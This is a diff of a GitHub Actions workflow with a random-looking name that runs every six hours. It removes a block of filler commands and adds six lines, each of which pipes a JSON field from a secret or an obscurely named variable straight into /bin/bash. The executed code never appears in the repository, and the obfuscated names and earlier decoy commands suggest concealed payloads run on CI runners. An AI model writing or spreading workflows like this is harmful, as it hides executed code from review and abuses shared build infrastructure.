@@ -1,38 +1,22 @@
 name: houyongliang1972
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-jobs:  # 8586
+    - cron: '19 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: houyongliang1972
         env:
-          d5747: ${{ secrets.d5747 }}
+          ylqme7: ${{ secrets.ylqme7 }}
         run: |
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          echo $d5747 | jq -r .p2181 | /bin/bash
-          echo "Build $(date +%s)"
-          echo "Time: $(date +%H:%M:%S)"
-          rm -rf tmp.temp.my.scrip.orc.zzz
-          which uname
-          cd ~
-          git status
-          printf "%s" "xyz" > tmp.xyz
-          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
-          which sqlite
-          : ' Another single-line comment '
-          which apt-get
-          popd
-          sleep 0.1 2>/dev/null || true
-          which screen
-          ping -c 10 www.google.com
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          echo "Dir: $(pwd)"
-          for i in {1..3}; do echo "Iter $i"; done
-          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          git remote -vv
+          echo $ylqme7 | jq -r .ur21 | /bin/bash
+          echo $oyw87701 | jq -r .kzzk55459 | /bin/bash
+          echo $ujf849 | jq -r .ocop90 | /bin/bash
+          echo $eb353 | jq -r .gwn56 | /bin/bash
+          echo $pvlua03 | jq -r .rhodl119 | /bin/bash
+          echo $ej5202 | jq -r .vtg1561 | /bin/bash
+
